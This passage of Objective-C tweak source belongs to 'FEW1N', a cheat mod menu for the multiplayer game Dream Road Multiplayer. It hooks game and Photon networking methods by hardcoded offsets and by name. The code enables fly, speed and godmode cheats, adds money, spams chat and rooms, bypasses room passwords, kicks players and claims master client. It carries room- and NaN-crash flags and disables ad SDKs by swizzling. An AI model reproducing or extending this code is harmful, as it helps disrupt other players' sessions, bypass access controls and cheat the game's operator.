    UIWindow *w = getKeyWindow(); if (!w) return;
    if (self.logOverlay) { [self.logOverlay removeFromSuperview]; self.logOverlay = nil; }

    CGFloat W = w.bounds.size.width, H = w.bounds.size.height;
    CGFloat ow = MIN(640.0, W - 20), oh = MIN(440.0, H - 20);
    self.logOverlay = [[UIView alloc] initWithFrame:CGRectMake((W-ow)/2, (H-oh)/2, ow, oh)];
    self.logOverlay.backgroundColor = [UIColor colorWithRed:0.97 green:0.99 blue:1.0 alpha:0.99];
    self.logOverlay.layer.cornerRadius = 16;
    self.logOverlay.layer.borderWidth = 1.5;
    self.logOverlay.layer.borderColor = C_CYAN.CGColor;

    UILabel *tl = [[UILabel alloc] initWithFrame:CGRectMake(14,10,ow-28,20)];
    tl.text = @"FEW1N LOG"; tl.textColor = C_CYAN;
    tl.font = [UIFont systemFontOfSize:13 weight:UIFontWeightBold];
    [self.logOverlay addSubview:tl];

    self.logText = [[UITextView alloc] initWithFrame:CGRectMake(10,36,ow-20,oh-86)];
    self.logText.backgroundColor = [UIColor colorWithRed:0.93 green:0.96 blue:0.99 alpha:1.0];
    self.logText.textColor = [UIColor colorWithRed:0.05 green:0.20 blue:0.32 alpha:1.0];
    self.logText.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    self.logText.editable = NO;
    self.logText.layer.cornerRadius = 8;
    // === KAPSAMLI DURUM OZETI ===
    NSMutableString *st = [NSMutableString string];
    [st appendString:@"══════ FEW1N DURUM ══════\n"];
    [st appendFormat:@"Base: 0x%lX | il2cpp: %@\n", (unsigned long)global_base, g_il2cppReady ? @"OK" : @"YOK"];
    [st appendFormat:@"Hook: %d OK / %d FAIL\n", hookSuccessCount, hookFailCount];
    [st appendString:@"── il2cpp metodlari ──\n"];
    [st appendFormat:@"Time:%@ RB-vel:%@ RB-pos:%@\n", g_mSetTS?@"✓":@"✗", g_mRbSetVel?@"✓":@"✗", rb_setPos?@"✓":@"✗"];
    [st appendFormat:@"TMP-rich:%@ RoomOpt:%@ CreateRoom:%@ RoomName:%@\n", g_mSetRichText?@"✓":@"✗", g_roomOptionsClass?@"✓":@"✗", pn_createRoom?@"✓":@"✗", rinfo_getName?@"✓":@"✗"];
    [st appendString:@"── araba hook tetiklenme ──\n"];
    [st appendFormat:@"*ANA* CarPlayerInput.FixedUpdate: %ld\n", fInput];
    [st appendFormat:@"CarDriveSystem:%@ CarNitro:%@\n", g_carDrive?@"✓":@"✗", g_carNitro?@"✓":@"✗"];
    [st appendFormat:@"AracPanel:%@ guc=%.1f dir=%.1f maks=%.0f\n", isCarPanelEnabled?@"A":@"K", carAccelPower, carSteerPower, carTopSpeed];
    [st appendFormat:@"nitro:%ld drive:%ld plate:%ld\nRCCP:%ld smRCC:%ld smPUN:%ld\n", fNitro, fDrive, fPlate, fRccp, fSmRCC, fSmPUN];
    [st appendFormat:@"Rigidbody(g_rb): %@  %@\n", g_rb?@"YAKALANDI ✓":@"YOK ✗", g_rb?@"(zipla/ucus/isinla calisir)":@"(mod arabayi ariyor - sur)"];
    [st appendString:@"── BASE TESTI (araba disi hook) ──\n"];
    [st appendFormat:@"timeScale:%ld chat:%ld odaSatir:%ld odaKurBtn:%ld baglanti:%ld\n", fTS, fChat, fRoomLine, fCreateBtn, fConn];
    long nonCar = fTS + fChat + fRoomLine + fCreateBtn + fConn;
    [st appendFormat:@"SONUC: %@\n", nonCar > 0 ? @"HOOKLAR CALISIYOR -> sorun araba sinifi" : @"HICBIR HOOK CALISMIYOR -> OFFSET/BASE OLU"];
    [st appendString:@"── ozellik durumlari ──\n"];
    [st appendFormat:@"Hiz:%dx Nitro:%@ Ucus:%@ DusukG:%@\n", speedMode, isInfiniteNitroEnabled?@"A":@"K", isFlyEnabled?@"A":@"K", isLowGravEnabled?@"A":@"K"];
    [st appendFormat:@"RenkliChat:%@ Spam:%@ ASCII:%@ Sifre:%@\n", isColorChatEnabled?@"A":@"K", isSpamEnabled?@"A":@"K", isAsciiAnimEnabled?@"A":@"K", isBypassPasswordEnabled?@"A":@"K"];
    [st appendFormat:@"OdaSpam:%@ (kurulan:%d) SurekliMod:%@\n", isRoomSpamEnabled?@"A":@"K", roomSpamCount, roomSpamContinuous?@"A":@"K"];
    // ═══════ GENIS HATA TARAMASI (otomatik tespit) ═══════
    [st appendString:@"────── HATA TARAMASI ──────\n"];
    int problems = 0;
    if (global_base == 0)            { [st appendString:@"[X] Base bulunamadi (UnityFramework yok)\n"]; problems++; }
    else {
        if (few1n_memOk((void*)global_base)) {
            uint32_t mg = *(uint32_t*)global_base;
            if (mg != 0xFEEDFACF) { [st appendFormat:@"[X] Base GECERSIZ (magic=0x%08X)\n", mg]; problems++; }
        } else { [st appendString:@"[X] Base okunamiyor (adres cop)\n"]; problems++; }
    }
    if (!g_il2cppReady)              { [st appendString:@"[X] il2cpp API hazir degil\n"]; problems++; }
    // NOT: Bu cihazda hook (MSHookFunction) calismiyor - bu NORMAL, hata degil.
    // Mod il2cpp yolunu kullaniyor. Sadece bilgi olarak gosterilir, sorun sayilmaz.
    if (hookFailCount > 0 && hookSuccessCount == 0)
                                     { [st appendString:@"[i] Hooklar kapali (normal) - il2cpp yolu aktif\n"]; }
    if (!g_mSetTS)                   { [st appendString:@"[X] Time.set_timeScale metodu yok\n"]; problems++; }
    if (!g_mRbSetVel)                { [st appendString:@"[X] Rigidbody.set_velocity metodu yok\n"]; problems++; }
    if (!g_mFindObjectOfType && !g_mFindObjInactive && !g_mFindAnyByType)
                                     { [st appendString:@"[X] FindObjectOfType bulucu yok - araba aranamaz\n"]; problems++; }
    if (!g_carDriveTypeObj)          { [st appendString:@"[!] CarDriveSystem tipi yok - araba hileleri kapali\n"]; problems++; }
    if (!g_rb && (isFlyEnabled || isLowGravEnabled || speedMode > 1))
                                     { [st appendString:@"[!] Rigidbody yok - mod arabayi henuz yakalamadi\n"]; problems++; }
    if (!pn_createRoom)              { [st appendString:@"[!] Oda kurma pointeri yok\n"]; problems++; }
    if (!pn_getPlayerList)           { [st appendString:@"[!] Oyuncu listesi pointeri yok\n"]; problems++; }
    if (problems == 0) [st appendString:@"[OK] Kritik hata bulunamadi\n"];
    else               [st appendFormat:@"Toplam %d sorun tespit edildi\n", problems];
    [st appendString:@"════════════════════════\n\n"];
    NSString *joined = gLog.count ? [gLog componentsJoinedByString:@"\n"] : @"(log yok - henuz calismadi)";
    self.logText.text = [st stringByAppendingString:joined];
    [self.logOverlay addSubview:self.logText];

    UIButton *copyB = [UIButton buttonWithType:UIButtonTypeSystem];
    copyB.frame = CGRectMake(10, oh-42, (ow-30)/2, 32);
    copyB.backgroundColor = C_CARD; copyB.layer.cornerRadius = 8;
    [copyB setTitle:@"\U0001F4CB Panoya Kopyala" forState:UIControlStateNormal];
    [copyB setTitleColor:C_CYAN forState:UIControlStateNormal];
    copyB.titleLabel.font = [UIFont systemFontOfSize:12 weight:UIFontWeightSemibold];
    [copyB addTarget:self action:@selector(copyLog) forControlEvents:UIControlEventTouchUpInside];
    [self.logOverlay addSubview:copyB];

    UIButton *closeB = [UIButton buttonWithType:UIButtonTypeSystem];
    closeB.frame = CGRectMake(20+(ow-30)/2, oh-42, (ow-30)/2, 32);
    closeB.backgroundColor = C_CARD; closeB.layer.cornerRadius = 8;
    [closeB setTitle:@"Kapat" forState:UIControlStateNormal];
    [closeB setTitleColor:C_RED forState:UIControlStateNormal];
    closeB.titleLabel.font = [UIFont systemFontOfSize:12 weight:UIFontWeightSemibold];
    [closeB addTarget:self action:@selector(closeLog) forControlEvents:UIControlEventTouchUpInside];
    [self.logOverlay addSubview:closeB];
    [w addSubview:self.logOverlay];
}

- (void)copyLog {
    // ekrandaki her seyi kopyala (durum ozeti + loglar)
    NSString *full = self.logText.text ?: @"";
    [UIPasteboard generalPasteboard].string = full;
    self.logText.text = [full stringByAppendingString:@"\n\n>>> PANOYA KOPYALANDI <<<"];
}

- (void)closeLog {
    if (self.logOverlay) { [self.logOverlay removeFromSuperview]; self.logOverlay = nil; }
}

- (void)present:(UIAlertController*)ac {
    if (!ac) return;
    dispatch_async(dispatch_get_main_queue(), ^{
        @try {
            UIViewController *top = few1n_topVC();
            if (!top) {
                UIWindow *w = getKeyWindow();
                top = w.rootViewController;
            }
            if (!top) return;

            // Eger mevcut ekran zaten bir alert penceresi ise, onu kapatip yenisini ac
            if ([top isKindOfClass:[UIAlertController class]]) {
                UIViewController *parent = top.presentingViewController;
                [top dismissViewControllerAnimated:NO completion:^{
                    UIViewController *target = parent ?: few1n_topVC();
                    if (target) [target presentViewController:ac animated:YES completion:nil];
                }];
                return;
            }

            if (top.isBeingPresented || top.isBeingDismissed) {
                few1n_after(0.15, ^{ [self present:ac]; });
                return;
            }

            [top presentViewController:ac animated:YES completion:nil];
        } @catch (...) {}
    });
}

@end

// restoreSettings — %ctor'dan bir kere cagrilir. Iki grup kullanilir:
//   loadBool/loadInt/loadFloat/loadStr(..., default) -> KALICI: NSUserDefaults'tan gelir
//   = false / = 0 sabiti + `[SESSION_ONLY]` yorumu -> OTURUMLUK: her tweak yuklenmesinde sifirlanir
// Oturumluk toggle'lara UI'da "(oturumluk)" etiketi eklendi.
static void restoreSettings(void) {
    speedMode              = loadInt(@"speedMode", 1);
    speedMult              = ((float)loadInt(@"speedMult10", 10)) / 10.0f;
    if (speedMult < 0.1f || speedMult > 10.0f) speedMult = 1.0f;
    isRoomLocked           = false;   // [SESSION_ONLY] odadan cikinca zaten anlamsiz
    isRoomInvisible        = false;   // [SESSION_ONLY]
    { NSString *rp = loadStr(@"roomPass", @""); if (rp.length) { strncpy(roomPasswordText, rp.UTF8String, sizeof(roomPasswordText)-1); roomPasswordText[sizeof(roomPasswordText)-1]='\0'; } }
    isInfiniteNitroEnabled = false;   // [SESSION_ONLY] ozellik kaldirildi, kalici kapali
    isCarPanelEnabled      = loadBool(@"carpanel", false);
    isEspEnabled           = false;   // [SESSION_ONLY] ESP overlay her aciliste kapali (guvenlik)
    isSpeedHud             = false;   // [SESSION_ONLY]
    isNoClip               = loadBool(@"noclip", false);
    isAntiGrav             = loadBool(@"antigrav", false);
    isCarSizeEnabled       = false;   // [SESSION_ONLY]
    carSizeVal             = loadFloat(@"carSize", 1.0f);
    isCarColorEnabled      = false;   // [SESSION_ONLY] materyal onbellegi bos aciliste
    carColorRainbow        = loadBool(@"carrainbow", true);
    g_carColor             = (Color4){ loadFloat(@"carR",1.0f), loadFloat(@"carG",0.0f), loadFloat(@"carB",0.0f), 1.0f };
    isCarPaintActive       = loadBool(@"carPaintActive", false);
    { NSString *cph = loadStr(@"carPaintHex", @"#FF0000"); if (cph.length) { strncpy(customCarPaintHex, cph.UTF8String, sizeof(customCarPaintHex)-1); customCarPaintHex[sizeof(customCarPaintHex)-1]='\0'; } }
    asciiColorCycle        = loadBool(@"asciiColor", false);
    lyricsColorCycle       = loadBool(@"lyricsColor", true);
    lyricsLoop             = loadBool(@"lyricsLoop", false);
    lyricsInterval         = loadFloat(@"lyricsInterval", 2.0f);
    { NSString *lt = loadStr(@"lyricsText", @"");
      if (lt.length) { g_lyrics = [[NSMutableArray alloc] init];
        for (NSString *l in [lt componentsSeparatedByString:@"\n"]) [g_lyrics addObject:[l stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]]]; } }
    isAnnounceEnabled      = false;   // [SESSION_ONLY]
    isGodmode              = false;   // [SESSION_ONLY] guvenlik icin her aciliste kapali
    isSelektor             = false;   // [SESSION_ONLY]
    isAlwaysLightsEnabled  = loadBool(@"alwayslights", false);
    // [SESSION_ONLY] Gizli il2cpp ozellikleri her aciliste kapali (guvenlik)
    isInfiniteNosEnabled    = false;
    isInfiniteFuelEnabled   = false;
    isMaxRpmEnabled         = false;
    isNoDamageV2Enabled     = false;
    isEngineImmortalEnabled = false;
    isNoTrafficEnabled      = false;
    isEmissivePaintEnabled  = loadBool(@"emissive", false);
    isExhaustFlameOnEnabled = loadBool(@"exhaustflame", false);
    isVidyoNamesEnabled     = loadBool(@"vidyonames", false);
    isAiChatModeEnabled     = loadBool(@"aichat", false);
    // v114.4: AI renkleri kalici
    NSString *nc = loadStr(@"aiNameCol", @"00E5FF");  strncpy(g_aiNameColorHex, nc.UTF8String, 7); g_aiNameColorHex[7]='\0';
    NSString *rc = loadStr(@"aiReplyCol", @"FF00FF"); strncpy(g_aiReplyColorHex, rc.UTF8String, 7); g_aiReplyColorHex[7]='\0';
    g_selFlashRate         = loadInt(@"selRate", 1);
    announceInterval       = (float)loadInt(@"announceIv", 5);
    { NSString *at = loadStr(@"announceText", @""); if (at.length) { strncpy(announceText, at.UTF8String, sizeof(announceText)-1); announceText[sizeof(announceText)-1]='\0'; } }
    isAutoGreetEnabled     = loadBool(@"autogreet", false);
    { NSString *gt = loadStr(@"greetText", @""); if (gt.length) { strncpy(g_greetText, gt.UTF8String, sizeof(g_greetText)-1); g_greetText[sizeof(g_greetText)-1]='\0'; } }
    carAccelPower          = loadFloat(@"caraccel", 3.0f);
    carSteerPower          = loadFloat(@"carsteer", 1.0f);
    carTopSpeed            = loadFloat(@"cartop",   300.0f);
    isColorChatEnabled     = false;   // [SESSION_ONLY] ozellik kaldirildi, kalici kapali
    isSpamEnabled          = loadBool(@"chatspam", false);
    isBypassPasswordEnabled= loadBool(@"bypass", true);
    isFlyEnabled           = loadBool(@"fly", false);
    flyAutoThrust          = loadBool(@"flyauto", false);
    isFlyPadShown          = false;   // [SESSION_ONLY] D-pad ekrani kapamasin
    isLowGravEnabled       = loadBool(@"lowgrav", false);
    isAsciiAnimEnabled     = loadBool(@"asciianim", false);
    g_gifColored           = loadBool(@"gifColored", false);
    g_gifCols              = loadInt(@"gifCols", 24);
    loadFavorites();
    asciiAnimIndex         = loadInt(@"asciiIdx", 0);
    isRoomSpamEnabled      = false;   // [SESSION_ONLY] spam kapali baslasin (guvenlik)
    roomSpamMaxCount       = loadInt(@"roomMax", 0);
    roomMaxPlayers         = loadInt(@"roomMaxP", 31);
    roomSpamTTL            = loadInt(@"roomTTL", 300000);
    roomSpamInterval       = loadInt(@"roomIv", 40) / 100.0f;
    roomSpamContinuous     = loadBool(@"roomcont", true);
    spamStyle              = loadInt(@"spamStyle", 0);
    NSString* rn = loadStr(@"roomName", @"<b><color=#FF0000>FEW1N</color></b>");
    strncpy(customRoomName, rn.UTF8String, sizeof(customRoomName)-1); customRoomName[sizeof(customRoomName)-1]='\0';
    isCustomPlateEnabled   = loadBool(@"plateEnabled", false);
    isMasterClaimDisabled  = loadBool(@"masterClaimOff", false);   // v70 modu tercihi
    // v90: RCCP toggle'lar crash sebep oluyor — HEPSI ZORLA KAPALI (offset uyumsuzluğu memory corruption)
    isBrakeGlowEnabled        = false; saveBool(@"brakeglow", false);
    isBrakeGlowDobEnabled     = false; saveBool(@"brakeglowdob", false);
    isBrakeGlowMinTempEnabled = false; saveBool(@"brakeglowmin", false);
    // v90: Farlar/Yakit/NOS kaldirildi, Hasar Yok + Balata Glow KALDI (placeholder — v91'de il2cpp ile gercek fix)
    isNoDamageEnabled      = loadBool(@"nodamage", false);
    isAutoMoneyEnabled     = loadBool(@"automoney", false);
    isNanCrashEnabled      = false;
    isRoomCrashActive      = false;
    panicCrash             = false;
    isAdBlockEnabled       = loadBool(@"adblock", false);  // v96: VARSAYILAN KAPALI (bug yaratiyordu)
    customMoneyAmount      = loadInt(@"moneyAmount", 100000000);
    NSString* pt = loadStr(@"plateText", @"FEW1N");
    strncpy(customPlateText, pt.UTF8String, sizeof(customPlateText)-1); customPlateText[sizeof(customPlateText)-1]='\0';
    NSString* stx = loadStr(@"spamText", @"FEW1N MOD MENU!");
    strncpy(chatSpamText, stx.UTF8String, sizeof(chatSpamText)-1); chatSpamText[sizeof(chatSpamText)-1]='\0';
    NSString* sc = loadStr(@"spamColor", @"00FFFF");
    strncpy(spamColorHex, sc.UTF8String, sizeof(spamColorHex)-1); spamColorHex[sizeof(spamColorHex)-1]='\0';
}

static uintptr_t GetUnityFrameworkBase(void) {
    uint32_t count = _dyld_image_count();
    for (uint32_t i=0;i<count;i++) {
        const char *n = _dyld_get_image_name(i);
        if (n && strstr(n, "UnityFramework")) return _dyld_get_image_vmaddr_slide(i);
    }
    for (uint32_t i=0;i<count;i++) {
        const char *n = _dyld_get_image_name(i);
        if (n && strstr(n, "DreamRoadMultiplayer.app/DreamRoadMultiplayer")) return _dyld_get_image_vmaddr_slide(i);
    }
    return 0;
}

static void InstallEverything(uintptr_t b) {
    global_base = b;
    FLog([NSString stringWithFormat:@"Base bulundu: 0x%lX", (unsigned long)b]);
    few1n_initIl2cpp();

    chatGetInst               = (void*(*)(void))(b + 0x31A6168);
    chatSend                  = (void(*)(void*,void*))(b + 0x31A626C);
    tmp_set_text              = (void(*)(void*,void*))(b + 0x65F4CC8);
    tmp_get_text              = (void*(*)(void*))(b + 0x65F4CC0);
    tmp_set_richText          = (void(*)(void*,bool))(b + 0x66017B8);   // v84: renk tag'lari render
    rinfo_getName             = (void*(*)(void*))(b + 0x59293A4);   // RoomInfo.get_Name
    pn_setNickName            = (void(*)(void*))(b + 0x5933940);
    pn_joinRoom               = (bool(*)(void*,void*))(b + 0x593A64C);
    pn_getInRoom              = w_pn_getInRoom;   // v114.11: il2cpp-by-name wrapper (drift-immune)
    pn_getConnReady           = (bool(*)(void))(b + 0x59333A8);   // oda kurma on-kosulu (bagli+hazir)
    mbp_getPhotonView         = (void*(*)(void*))(b + 0x594DB48);  // dogru lobi instance secimi (kick RPC)
    pn_getCurrentRoom         = w_pn_getCurrentRoom;   // v114.11: il2cpp-by-name wrapper
    room_setMaxPlayers        = (void(*)(void*,int))(b + 0x5927B70); // odayi buyut
    room_getMaxPlayers        = (int(*)(void*))(b + 0x5927B68);
    room_setIsOpen            = (void(*)(void*,bool))(b + 0x59279B0);  // kilit
    room_setIsVisible         = (void(*)(void*,bool))(b + 0x5927A90);  // gizli
    room_setCustomProperties  = (bool(*)(void*,void*,void*,void*))(b + 0x5916158); // sifre
    pn_getNickName            = w_pn_getNickName;   // v114.11: il2cpp-by-name wrapper
    pn_leaveRoom              = (bool(*)(bool))(b + 0x593B2D8);
    pn_closeConnection        = (bool(*)(void*))(b + 0x5938844);   // kick direkt (hook olmadan)
    lobbyGetInst              = (void*(*)(void))(b + 0x54A8098);
    playerManagerGetInst      = (void*(*)(void))(b + 0x5A2DE20);
    pm_updateNicknameInternal = (void(*)(void*,void*))(b + 0x5A3DDD4);
    pm_getMoney               = (int(*)(void*))(b + 0x5A4346C);
    pm_syncWithServer         = (void(*)(void*))(b + 0x5A2DF80);
    pm_addMoney               = (void(*)(void*,int))(b + 0x5A43A2C);
    ts_get                    = (float(*)(void))(b + 0x67718D8);
    rb_getVel                 = (void(*)(void*,Vec3*))(b + 0x6837B7C);
    rb_setVel                 = (void(*)(void*,Vec3*))(b + 0x6837C88);
    rb_getPos                 = (void(*)(void*,Vec3*))(b + 0x6838E24);   // get_position_Injected
    rb_setPos                 = (void(*)(void*,Vec3*))(b + 0x6838F30);   // set_position_Injected
    lobby_createRoom          = (void(*)(void*))(b + 0x54A94A4);
    lobby_leaveRoom           = (void(*)(void*))(b + 0x54A9F1C);
    pn_createRoom             = (bool(*)(void*,void*,void*,void*))(b + 0x5939B4C);
    pn_joinOrCreateRoom       = (bool(*)(void*,void*,void*,void*))(b + 0x593A05C);   // YENİ: Dolu odalara katılma bypass
    pn_setMasterClient        = (bool(*)(void*))(b + 0x5938B3C);   // YENI: Oda master alma
    pn_loadLevelStr           = (bool(*)(void*))(b + 0x5941D94);   // YENI: Harita yukleme (string)
    pn_loadLevelInt           = (bool(*)(int))(b + 0x5941B64);     // YENI: Harita yukleme (int)
    hrMainStartRace           = (void(*)(void*))(b + 0x549130C);   // HR_MainMenuHandler.StartRace()
    unity_LoadSceneStr        = (void(*)(void*))(b + 0x6781268);   // UnityEngine.SceneManager.LoadScene(string)
    unity_LoadSceneInt        = (void(*)(int))(b + 0x6781430);     // UnityEngine.SceneManager.LoadScene(int)
    pn_getActiveSceneName       = (void*(*)(void))(b + 0x59618B0); // YENI: Aktif sahne adi
    pn_getActiveSceneBuildIndex = (int(*)(void))(b + 0x5961920);   // YENI: Aktif sahne indeksi
    pn_getPlayerList          = (void*(*)(void))(b + 0x59339D0);
    pn_getPlayerListOthers    = (void*(*)(void))(b + 0x5933B88);
    pn_getLocalPlayer         = w_pn_getLocalPlayer;   // v114.11: il2cpp-by-name wrapper
    ply_getNickName           = (void*(*)(void*))(b + 0x5924574);
    ply_getActorNumber        = (int(*)(void*))(b + 0x592455C);
    ply_getIsMaster           = w_ply_getIsMaster;   // v114.11: il2cpp-by-name wrapper
    ply_getUserId             = (void*(*)(void*))(b + 0x5924630);
    lobby_carSelectMenu       = (void(*)(void*))(b + 0x54ABFD4);
    cps_TeleportCar_RPC       = (void(*)(void*,Vec3,Quaternion,void*))(b + 0x5A49AE0);
    rbps_TeleportCar_RPC      = (void(*)(void*,Vec3,Quaternion,void*))(b + 0x5A4C494);
    hrph_TeleportPlayerRPC    = (void(*)(void*,Vec3,void*))(b + 0x54A6F00);
    ssrcc_RpcTeleport         = (void(*)(void*,Vec3,Vec3,Vec3,float,void*))(b + 0x5A5B788);
    pn_setAutomaticallySyncScene = (void(*)(bool))(b + 0x5934408);     // PhotonNetwork.AutomaticallySyncScene = true
    unity_loadSceneStr           = (void(*)(void*))(b + 0x6781268);    // UnityEngine.SceneManagement.SceneManager.LoadScene(string)
    lobbySetScene                = (void(*)(void*,void*))(b + 0x54ABFFC);    // HR_PhotonLobbyManager.SetScene(string)
    mapList_getInstance          = (void*(*)(void))(b + 0x54B3630);          // MapList.ely() -> instance
    photonMgrEnp                 = (void(*)(void*,bool))(b + 0x54B5260);     // PhotonManager.enp(string, bool)
    mapSel_selectMap             = (void(*)(void*,void*))(b + 0x54B389C);    // MapSelection.SelectMap(string)
    lobbyStartGame               = (void(*)(void*))(b + 0x54A93B0);          // HR_PhotonLobbyManager.StartGameButton()
    lobbyDummyStartGame          = (void(*)(void*))(b + 0x54AF76C);          // HR_PhotonLobbyManagerDummy.StartGameButton()
    room_getIsOpen               = (bool(*)(void*))(b + 0x59279A8);           // Room.get_IsOpen
    room_setIsOpen               = (void(*)(void*,bool))(b + 0x59279B0);      // Room.set_IsOpen (kilitle/ac)
    room_getIsVisible            = (bool(*)(void*))(b + 0x5927A88);           // Room.get_IsVisible
    room_setIsVisible            = (void(*)(void*,bool))(b + 0x5927A90);      // Room.set_IsVisible (gizle/goster)
    pn_raiseEvent           = (void(*)(unsigned char,void*,bool,void*))(b + 0x593C000); // PhotonNetwork.RaiseEvent (dump.cs'den dogrula)

    // v114.19: TÜM safeHook çağrıları drift-immune safeHookByName ile isim üzerinden.
    // Hardcoded RVA (b + 0xNN) offset'leri KALKTI — oyun her update'inde önceki hepsi
    // yanlış yere kuruluyor, per-frame hook'lar sessizce garbage adrese giriyor ve
    // 1.4.3'te DR splash sonrası crash yapıyordu. il2cpp_method_get_pointer runtime'da
    // her metodun gerçek code address'ini döndürür — sürüm değişse bile isim aynıysa çalışır.
    // Obfuscate edilmiş metotlar 1.4.3 dump.cs'ten kısa mangled ismiyle geçirildi (fzk, ghs,
    // fgp, eqm, eqn). Bir sonraki oyun sürümü obfuscation seed'i değişirse bunlar kırılır,
    // o zaman signature-based lookup eklenir (v114.20+).

    // Photon PUN callback'leri (isim korunmuş)
    safeHookByName("", "HR_PhotonLobbyManager",  "OnRoomListUpdate",       1, (void*)h_onRoomListUpdate,       (void**)&o_onRoomListUpdate,      "HR_PhotonLobbyManager.OnRoomListUpdate");
    safeHookByName("", "HR_PhotonLobbyManager",  "OnMasterClientSwitched", 1, (void*)h_onMasterClientSwitched, (void**)&o_onMasterClientSwitched,"HR_PhotonLobbyManager.OnMasterClientSwitched");
    safeHookByName("", "HR_PhotonLobbyManager",  "OnCreateRoomFailed",     2, (void*)h_onCreateFail,           (void**)&o_onCreateFail,          "HR_PhotonLobbyManager.OnCreateRoomFailed");
    safeHookByName("", "HR_PhotonLobbyManager",  "OnJoinRoomFailed",       2, (void*)h_onJoinFail,             (void**)&o_onJoinFail,            "HR_PhotonLobbyManager.OnJoinRoomFailed");
    safeHookByName("", "HR_PhotonLobbyManager",  "CreateRoomButton",       0, (void*)h_createRoomBtn,          (void**)&o_createRoomBtn,         "HR_PhotonLobbyManager.CreateRoomButton");

    // Unity / Photon / TMP core (isim korunmuş)
    safeHookByName("UnityEngine",     "Time",           "set_timeScale",   1, (void*)h_setTimeScale,    (void**)&o_setTimeScale,    "Time.set_timeScale");
    safeHookByName("Photon.Pun",      "PhotonNetwork",  "CloseConnection", 1, (void*)h_closeConnection, (void**)&o_closeConnection, "PhotonNetwork.CloseConnection");
    safeHookByName("TMPro",           "TMP_Text",       "set_text",        1, (void*)h_tmpSetText,      (void**)&o_tmpSetText,      "TMP_Text.set_text");
    safeHookByName("",                "ChatManager",    "Send",            1, (void*)h_chatSend,        (void**)&o_chatSend,        "ChatManager.Send");

    // CarPlayerInput.FixedUpdate ismi korunmuş (Unity engine method)
    safeHookByName("", "CarPlayerInput", "FixedUpdate", 0, (void*)h_playerInputFixed, (void**)&o_playerInputFixed, "CarPlayerInput.FixedUpdate *ANA*");

    // SmoothSync classes — Update ismi Unity engine metotu, korunmuş
    safeHookByName("", "SmoothSyncRCC",  "Update", 0, (void*)h_smRCC, (void**)&o_smRCC, "SmoothSyncRCC.Update");
    safeHookByName("", "SmoothSyncPUN2", "Update", 0, (void*)h_smPUN, (void**)&o_smPUN, "SmoothSyncPUN2.Update");

    // RCCP_CarController.Update — eski "RCCP.Update" adlandırması
    safeHookByName("", "RCCP_CarController", "Update", 0, (void*)h_rccpUpdate, (void**)&o_rccpUpdate, "RCCP_CarController.Update (rb yakala)");

    // Obfuscated metotlar (1.4.3 dump'tan mangled name)
    safeHookByName("", "CarDriveSystem",       "fgp", 4, (void*)h_driveMove,     (void**)&o_driveMove,     "CarDriveSystem.Move (obf fgp)");
    safeHookByName("", "PlateVariant",         "ghs", 1, (void*)h_plateChange,   (void**)&o_plateChange,   "PlateVariant.Change (obf ghs)");
    safeHookByName("", "ChatManager",          "fzk", 1, (void*)h_chatFup,       (void**)&o_chatFup,       "ChatManager.fup (obf fzk — gelen chat)");
    safeHookByName("", "HR_UI_RoomListLine",   "eqm", 0, (void*)h_roomConnect,   (void**)&o_roomConnect,   "HR_UI_RoomListLine.Connect (obf eqm)");
    safeHookByName("", "HR_UI_RoomListLine",   "eqn", 6, (void*)h_roomLineSetup, (void**)&o_roomLineSetup, "HR_UI_RoomListLine.Setup (obf eqn)");

    // Nitro getterlari: RCCP_Nos.get/set_amount — obfuscated. Eski hardcoded offset (0x54CFE14/1C)
    // hâlâ 1.4.3'te bozuk olabilir. Skip — SONSUZ NOS özelliği zaten il2cpp field write ile de çalışıyor.
    // safeHookByName("", "RCCP_Nos", "?", 0, (void*)h_getNitro, (void**)&o_getNitro, "RCCP_Nos.get_nitroAmount");

    // PlayerManager.AddMoney — obfuscated + sunucu-kilitli. Skip.
    // CAS reklam hookları — obj-c swizzle zaten yapıyor (%ctor içinde). Skip.

    FLog([NSString stringWithFormat:@"v114.19 hook by-name: %d OK, %d fail (obfuscated seed değişirse fail sayısı artar)", hookSuccessCount, hookFailCount]);

    FLog([NSString stringWithFormat:@"Bitti: %d hook OK, %d fail", hookSuccessCount, hookFailCount]);
    [[FEW1NMenu shared] build];
}

static int few1n_attempts = 0;
static void few1n_poll(void) {
    few1n_attempts++;
    uintptr_t b = GetUnityFrameworkBase();
    if (b != 0) { InstallEverything(b); return; }
    if (few1n_attempts >= 80) { FLog(@"UnityFramework BULUNAMADI (80 deneme)"); [[FEW1NMenu shared] build]; return; }
    few1n_after(0.5, ^{ few1n_poll(); });
}




%ctor {
    few1n_setupCrashGuard();
    FLog(@"v114.8 basladi, UnityFramework araniyor...");
    restoreSettings();

    // ===== REKLAM BOZUCU: TUM reklam SDK'larini engelle (Obj-C runtime swizzle) =====
    // Bu blok il2cpp'ye BAGIMLI DEGIL - native Obj-C siniflarini hooklar.
    // Oyun yukseltilse bile reklam SDK siniflari ayni kalir → kalici cozum.
    if (isAdBlockEnabled) {
        FLog(@"\U0001F6AB Reklam bozucu AKTIF - tum SDK'lar engelleniyor");

        // Reklam SDK metodlarini NOP'la. Tek helper + yon parametresi:
        //   'i' = instance metod (nil dondur), 'c' = class metod (nil dondur),
        //   'b' = bool (instance ya da class - hangisi varsa) NO dondur.
        // Not: block variadic '...' ObjC block ABI'sinde tanimsiz; fazla arg'lar
        // ARM64 caller-cleanup ile zaten yok sayilir, block sadece self alsin.
        void (^adNop)(NSString*, NSString*, char) = ^(NSString* cls, NSString* sel, char kind) {
            Class c = NSClassFromString(cls);
            if (!c) return;
            SEL s = NSSelectorFromString(sel);
            Method m = (kind == 'c') ? class_getClassMethod(c, s) : class_getInstanceMethod(c, s);
            if (!m && kind == 'b') m = class_getClassMethod(c, s);
            if (!m) return;
            IMP nop = (kind == 'b')
                ? imp_implementationWithBlock(^BOOL(id _self){ (void)_self; return NO; })
                : imp_implementationWithBlock(^id  (id _self){ (void)_self; return nil; });
            method_setImplementation(m, nop);
        };
        void (^swizzleToNop)(NSString*, NSString*)      = ^(NSString* cls, NSString* sel){ adNop(cls, sel, 'i'); };
        void (^swizzleClassToNop)(NSString*, NSString*) = ^(NSString* cls, NSString* sel){ adNop(cls, sel, 'c'); };
        void (^swizzleToBoolFalse)(NSString*, NSString*) = ^(NSString* cls, NSString* sel){ adNop(cls, sel, 'b'); };

        // ===== GOOGLE ADMOB (GAD) =====
        swizzleToNop(@"GADInterstitialAd", @"presentFromRootViewController:");
